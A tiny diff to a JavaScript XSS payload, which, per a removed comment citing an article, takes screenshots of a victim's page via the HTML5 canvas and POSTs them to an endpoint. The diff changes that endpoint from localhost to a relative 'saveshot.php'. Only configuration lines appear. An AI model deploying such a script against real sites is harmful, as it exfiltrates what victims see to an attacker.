@@ -1,9 +1,8 @@
-// URL: http://www.idontplaydarts.com/2012/04/taking-screenshots-using-xss-and-the-html5-canvas
 
 if (typeof vx === 'undefined') {
 	
 // The destination to POST the screenshot to - change it here
-var postDest = 'http://localhost/saveshot.php';
+var postDest = 'saveshot.php';
 
 var vx = 'ok';
 
